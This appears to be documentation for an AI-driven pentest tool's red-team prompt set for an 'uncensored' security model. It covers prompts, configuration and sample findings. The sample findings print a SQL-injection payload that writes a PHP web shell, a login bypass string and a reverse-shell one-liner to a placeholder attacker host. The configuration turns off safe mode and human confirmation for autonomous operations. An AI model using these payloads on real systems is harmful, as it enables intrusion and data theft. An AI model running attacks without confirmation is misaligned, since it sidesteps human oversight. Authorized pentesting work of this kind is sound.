# DeepHat V1 7B - Red Team Optimized Prompts

## Overview

DeepHat V1 7B is a specialized cybersecurity language model purpose-built for offensive security operations, DevSecOps, and red team engagements. Guardian includes optimized prompts that leverage DeepHat's unique capabilities for adversary simulation and exploitation analysis.

## About DeepHat V1 7B

**Model Details**:
- **Base Model**: Qwen2.5-Coder-7B (fine-tuned)
- **Parameters**: 7.61 billion
- **Context Length**: 131,072 tokens
- **Specialization**: Cybersecurity, Red Team Operations, DevSecOps
- **Release**: 2025 (successor to WhiteRabbitNeo)
- **Sponsor**: Kindo AI

**Key Capabilities**:
- **Uncensored Design**: Can discuss offensive security topics, demonstrate exploits, and simulate adversary behavior without content restrictions
- **Red Team Operations**: Simulate adversary tactics, develop realistic threat scenarios, explain exploitation techniques
- **Security Expertise**: Read firewall configs, analyze vulnerabilities, perform root cause analysis, understand attack chains
- **Training Data**: Real-world security incidents, vulnerability databases, infrastructure configurations, exploit techniques

**Sources**:
- [DeepHat Official](https://www.deephat.ai/)
- [Hugging Face Model Page](https://huggingface.co/DeepHat/DeepHat-V1-7B)
- [AI Models Info](https://www.aimodels.fyi/models/huggingFace/deephat-v1-7b-deephat)

## Prompt Optimization Strategy

### Design Philosophy

DeepHat prompts are optimized for **offensive security mindset** rather than generic security analysis:

1. **Exploitation-Focused**: Prioritize weaponizability over theoretical vulnerabilities
2. **Attack Chain Thinking**: Link findings to build realistic compromise scenarios
3. **Adversary Simulation**: Frame analysis from attacker perspective
4. **MITRE ATT&CK Alignment**: Map findings to real-world tactics and techniques
5. **Red Team Language**: Use operational security terminology

### Key Differences from Default Prompts

| Aspect | Default Prompts | DeepHat Prompts |
|--------|----------------|-----------------|
| Perspective | Defensive security analyst | Offensive red team operator |
| Focus | Vulnerability identification | Exploitation feasibility |
| Severity | CVSS-based | Exploitability-based |
| Analysis | What's broken? | How to exploit? |
| Reporting | Compliance-focused | Attack chain narrative |
| Language | Technical/neutral | Red team operational |

## Prompt Features

### Analyst Prompts

**Red Team Analysis Approach**:
- Assess **exploitability**: Trivial/Easy/Moderate/Hard/Critical-Research
- Identify **attack vectors**: Specific exploitation steps
- Map to **MITRE ATT&CK TTPs**: Real-world adversary techniques
- Evaluate **defense bypass**: Evasion and detection avoidance
- Build **attack chains**: How vulnerabilities combine for impact

**Example Output Format**:
```
[CRITICAL] Unauthenticated RCE in Admin Panel
Evidence: "/admin debug=1 → full stack trace with credentials"
Exploitability: Trivial (no auth required, direct exploitation)
Attack Vector: POST /admin?debug=1 with serialized payload
Impact: Full system compromise, root shell, credential access
Defense Bypass: WAF bypass via parameter pollution
MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
CVE: CVE-2024-XXXXX
CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
```

### Planner Prompts

**Red Team Operation Planning**:
- **Kill Chain Progression**: Recon → Weaponization → Delivery → Exploitation
- **MITRE Framework**: Align operations with ATT&CK tactics
- **Operational Security**: Prioritize stealth and detection avoidance
- **APT Simulation**: Realistic adversary behavior patterns
- **Objective-Focused**: Drive toward compromise goals

**Decision Criteria**:
1. Maintains OPSEC (avoid detection)
2. Progresses toward objective (data access, control)
3. Expands attack surface (new targets, vulnerabilities)
4. Follows realistic adversary TTP

### Reporter Prompts

**Red Team Engagement Reporting**:
- **Attack Narrative**: Story of how system was compromised
- **Exploitation Details**: Technical PoCs and attack chains
- **MITRE ATT&CK Mapping**: TTPs employed during engagement
- **Business Impact**: Real-world consequences of compromise
- **Adversary-Informed Defense**: Remediation from attacker perspective

**Report Structure**:
1. Executive Summary (business risk narrative)
2. Attack Scenario (compromise story)
3. Exploitation Details (technical findings with PoCs)
4. MITRE ATT&CK Mapping (TTPs used)
5. Remediation Roadmap (prioritized, adversary-informed)
6. IOCs and Detection Signatures

## Configuration

### Basic Configuration

```yaml
# config/guardian.yaml
ai:
  provider: ollama
  model: "DeepHat/DeepHat-V1-7B:latest"
  prompt_set: "deephat_v1_7b"  # Red team prompts
  temperature: 0.3  # Slightly higher for creative exploitation
  context_window: 131072  # DeepHat supports large context
```

### Auto-Detection

Guardian automatically detects DeepHat and uses red team prompts:

```yaml
ai:
  provider: ollama
  model: "DeepHat/DeepHat-V1-7B:latest"
  # prompt_set auto-detects as "deephat_v1_7b"
```

**Detection patterns**: `deephat`, `deep-hat`, `deephat-v1`

### Advanced Configuration

```yaml
ai:
  provider: ollama
  model: "DeepHat/DeepHat-V1-7B:latest"
  prompt_set: "deephat_v1_7b"
  temperature: 0.3
  context_window: 131072
  max_tokens: 16384

  # Enable detailed logging for red team analysis
  log_llm_io_file: true
  log_llm_full_io: true

pentest:
  # DeepHat excels in offensive mode
  safe_mode: false

  # Aggressive scanning for comprehensive attack surface
  max_parallel_tools: 5
  tool_timeout: 1200  # Longer for thorough exploitation
```

## Usage Examples

### Example 1: Web Application Pentest

```bash
# Run comprehensive web pentest with DeepHat
guardian scan --target https://example.com --workflow web_pentest
```

**Expected Output** (with DeepHat prompts):
- Exploitation-focused vulnerability analysis
- Attack chain construction (entry → privilege escalation → impact)
- MITRE ATT&CK TTP mapping
- Red team operational recommendations
- Adversary-informed remediation priorities

### Example 2: Network Pentest

```bash
# Network infrastructure red team assessment
guardian scan --target 192.168.1.0/24 --workflow network_pentest
```

**Expected Output**:
- Lateral movement opportunities
- Privilege escalation paths
- Persistence mechanism identification
- Defense evasion techniques
- Attack surface expansion recommendations

### Example 3: API Security Assessment

```bash
# API security testing with exploitation focus
guardian scan --target https://api.example.com --workflow api_pentest
```

**Expected Output**:
- Authentication bypass techniques
- Authorization escalation paths
- Data exfiltration channels
- Business logic exploitation
- API abuse scenarios

## Prompt Comparison

### Analyst System Prompt

**Default** (defensive):
```
You are the Security Analyst for Guardian...
Your role is to:
1. Analyze raw tool outputs
2. Identify security vulnerabilities
3. Assess severity and impact
4. Filter false positives
```

**DeepHat** (offensive):
```
Offensive Security Analyst for Guardian pentest tool.

You are a red team operator analyzing security scan results.
Your expertise:
- Advanced exploitation techniques
- CVE analysis and weaponization
- Attack chain construction
- Zero-day pattern recognition

Red team mindset: Can this be exploited? How? What's the impact?
```

### Finding Format

**Default**:
```
[HIGH] SQL Injection Vulnerability
Evidence: "Error in SQL syntax"
Impact: Database access possible
Recommendation: Use parameterized queries
```

**DeepHat**:
```
[CRITICAL] Exploitable SQL Injection → RCE
Evidence: "mysql_query() error: syntax error near 'admin'"
Exploitability: Easy (no WAF, direct injection)
Attack Vector: ' UNION SELECT '<?php system($_GET[c])?>' INTO OUTFILE '/var/www/shell.php' --
Impact: Remote code execution, full system compromise
Defense Bypass: No input validation, file write permissions
MITRE ATT&CK: T1190 (Exploit Public-Facing), T1505.003 (Web Shell)
```

## Best Practices

### 1. Leverage DeepHat's Strengths

**Do**:
- Request specific exploitation techniques
- Ask for attack chain construction
- Seek defense evasion recommendations
- Request MITRE ATT&CK mapping

**Don't**:
- Use for generic security advice
- Expect compliance-focused analysis
- Request defensive-only perspectives

### 2. Configure for Red Team Operations

```yaml
ai:
  temperature: 0.3  # Creative exploitation analysis

pentest:
  safe_mode: false  # Enable aggressive testing
  require_confirmation: false  # Autonomous operations
```

### 3. Use Appropriate Workflows

**Best suited for**:
- `web_pentest` - Web application red teaming
- `network_pentest` - Infrastructure compromise
- `api_pentest` - API exploitation
- Custom adversary simulation workflows

**Less suited for**:
- Compliance scanning
- Passive vulnerability assessment
- Defensive security audits

### 4. Interpret Results Correctly

DeepHat reports focus on **exploitability** not just presence:
- **Critical** = Immediate exploitation possible
- **High** = Exploitation likely with moderate effort
- **Medium** = Requires chaining or specific conditions
- **Low** = Theoretical or requires significant research

### 5. Document for Red Team Engagements

DeepHat reports are ideal for:
- Red team engagement reports
- Adversary simulation exercises
- Purple team activities
- Executive risk presentations (attack narrative style)

## Performance Optimization

### Memory Configuration

DeepHat supports very large context (131K tokens):

```yaml
ai:
  context_window: 131072
  max_tool_output_chars: 50000  # Include more scan data
```

### Temperature Settings

```yaml
# Conservative (reliable exploitation analysis)
temperature: 0.2

# Balanced (recommended)
temperature: 0.3

# Creative (novel attack techniques)
temperature: 0.5
```

### Parallel Operations

DeepHat can handle multiple concurrent analyses:

```yaml
pentest:
  max_parallel_tools: 5  # Efficient for red team workflow
```

## Troubleshooting

### Issue: Generic Security Analysis

**Symptom**: Reports don't include exploitation details or attack chains

**Solution**: Verify prompt_set is configured:
```yaml
ai:
  model: "DeepHat/DeepHat-V1-7B:latest"
  prompt_set: "deephat_v1_7b"  # Explicit
```

### Issue: Overly Cautious Recommendations

**Symptom**: Model refuses offensive security discussion

**Solution**: Check model version - ensure using uncensored DeepHat:
```bash
ollama list | grep -i deephat
# Should show: DeepHat/DeepHat-V1-7B:latest
```

### Issue: Missing MITRE ATT&CK Mapping

**Symptom**: Reports lack TTP identification

**Solution**: DeepHat prompts automatically request ATT&CK mapping. If missing:
1. Increase temperature: `temperature: 0.3`
2. Verify prompt set loaded correctly
3. Check model has sufficient context

### Issue: Low Quality Exploitation Analysis

**Symptom**: Shallow attack chain analysis

**Solutions**:
1. Increase context window to include more scan data
2. Use temperature 0.3-0.4 for creative analysis
3. Ensure sufficient tool output is provided
4. Try more detailed tool commands

## Comparison with Other Models

| Model | Best For | DeepHat Advantage |
|-------|----------|-------------------|
| GPT-4 | General purpose pentest | DeepHat: Deeper exploitation analysis, uncensored |
| Claude | Compliance reports | DeepHat: Attack-focused narrative |
| Llama 3.2 3B | Resource-constrained | DeepHat: Domain expertise, better accuracy |
| DeepSeek Coder | Code review | DeepHat: Security-specific training |

## Example Report Excerpts

### Executive Summary (DeepHat Style)

```markdown
## Executive Summary

A red team assessment of example.com revealed **full application compromise**
is achievable through a multi-stage attack chain:

1. **Initial Access**: Unauthenticated SQL injection in login form provides
   database administrator credentials (MITRE: T1190)

2. **Privilege Escalation**: Compromised admin panel allows PHP web shell
   upload via insecure file handling (T1505.003)

3. **Impact**: Attacker gains remote code execution as web server user,
   enabling data exfiltration of 50,000+ customer records and potential
   lateral movement to internal network (T1567, T1021)

**Business Impact**: Complete confidentiality breach, regulatory fines
(GDPR), reputation damage, potential ransomware deployment.

**Critical Action**: Patch SQL injection within 24 hours to prevent
active exploitation.
```

### Technical Finding (DeepHat Style)

```markdown
## [CRITICAL] SQL Injection → RCE Chain

**Vulnerability**: Unauthenticated SQL injection in login endpoint

**Evidence**:
```
POST /api/login
username=admin' OR '1'='1&password=x
→ Response: {"user": "admin", "role": "administrator", "token": "..."}
```

**Exploitability**: Trivial
- No authentication required
- No WAF or input validation
- Direct database access
- File write permissions enabled

**Attack Vector**:
```sql
username=' UNION SELECT '<?php system($_GET["c"]); ?>'
INTO OUTFILE '/var/www/html/shell.php' --&password=x
```

**Exploitation Steps**:
1. Inject SQL to write web shell: `/api/login` (above payload)
2. Access shell: `https://example.com/shell.php?c=whoami`
3. Establish reverse shell: `?c=bash -i >& /dev/tcp/attacker/4444 0>&1`
4. Privilege escalation: Kernel exploit or credential harvesting

**Impact**:
- Remote Code Execution (RCE)
- Full system compromise
- Database access (customer data, credentials)
- Lateral movement to internal network
- Persistence via backdoor accounts

**MITRE ATT&CK**:
- T1190: Exploit Public-Facing Application
- T1505.003: Server Software Component: Web Shell
- T1059.004: Command and Scripting Interpreter: Unix Shell

**Defense Evasion**: None required (no protections present)

**Remediation Priority**: IMMEDIATE (24 hours)
```

## Future Enhancements

Planned improvements for DeepHat integration:
- Custom red team workflow templates
- Adversary emulation profiles (APT groups)
- Automated attack chain visualization
- MITRE ATT&CK coverage reporting
- Purple team collaboration features

## Contributing

To improve DeepHat prompts:
1. Test with real-world pentests
2. Submit findings and suggestions
3. Share successful exploitation techniques
4. Contribute red team workflow templates

## References

- [DeepHat Model](https://huggingface.co/DeepHat/DeepHat-V1-7B)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Guardian Documentation](../README.md)
- [Prompt Optimization Guide](./PROMPT_OPTIMIZATION.md)

## Legal and Ethical Notice

⚠️ **Important**: DeepHat's uncensored nature and offensive security focus require responsible use:

- Only use on systems you own or have written authorization to test
- Follow responsible disclosure for vulnerabilities
- Comply with local laws and regulations
- Use for defensive security improvement, not malicious purposes
- Maintain proper authorization documentation

Guardian and DeepHat are tools for **authorized security testing only**.
